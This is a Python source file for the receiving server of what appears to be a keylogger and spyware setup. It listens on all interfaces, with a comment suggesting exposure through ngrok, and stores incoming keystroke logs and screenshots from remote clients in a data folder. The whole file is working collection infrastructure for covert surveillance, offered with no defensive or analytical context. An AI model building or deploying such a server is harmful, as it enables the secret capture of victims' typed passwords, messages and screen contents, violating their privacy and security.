# server2.py
import socket
import os
import struct
import datetime

DATA_FOLDER = os.path.join(os.path.dirname(__file__), "../data")
os.makedirs(DATA_FOLDER, exist_ok=True)

HOST = "::"       # Listen on all IPv4/IPv6 interfaces
PORT = 6000       # Choose a free port, expose with ngrok tcp

def save_keystrokes(text):
    with open(os.path.join(DATA_FOLDER, "keystrokes.txt"), "a", encoding="utf-8") as f:
        f.write(text + "\n")

def save_image(image_bytes):
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"screenshot_{timestamp}.png"
    filepath = os.path.join(DATA_FOLDER, filename)
    with open(filepath, "wb") as f:
        f.write(image_bytes)

def handle_client(conn):
    with conn:
        # Read the FIRST 4 bytes (the header)
        header = conn.recv(4)
        if not header:
            return  # Client disconnected immediately

        # Read the NEXT 4 bytes (the length)
        length_bytes = conn.recv(4)
        if not length_bytes or len(length_bytes) != 4:
            return  # Client didn't send proper length
        length = struct.unpack("!I", length_bytes)[0]

        # Now read the EXACT number of bytes for the payload
        data = b""
        while len(data) < length:
            chunk = conn.recv(min(4096, length - len(data)))
            if not chunk:
                break  # Connection closed prematurely
            data += chunk

        if len(data) != length:
            print(f"[-] Incomplete data received. Expected {length}, got {len(data)}")
            return

        # Process the single message we received
        if header == b"KEYS":
            try:
                text_data = data.decode("utf-8", errors="replace")
                save_keystrokes(text_data)
                print(f"[+] Received keystrokes: {len(text_data)} characters")
            except Exception as e:
                print(f"[-] Error decoding keystrokes: {e}")
        elif header == b"IMAG":
            save_image(data)
            print(f"[+] Received image: {len(data)} bytes")
        else:
            print(f"[-] Unknown header: {header}")

def main():
    with socket.socket(socket.AF_INET6, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()
        print(f"Server 2 listening on port {PORT}...")
        while True:
            conn, addr = s.accept()
            print(f"Connection from {addr}")
            handle_client(conn)

if __name__ == "__main__":
    main()
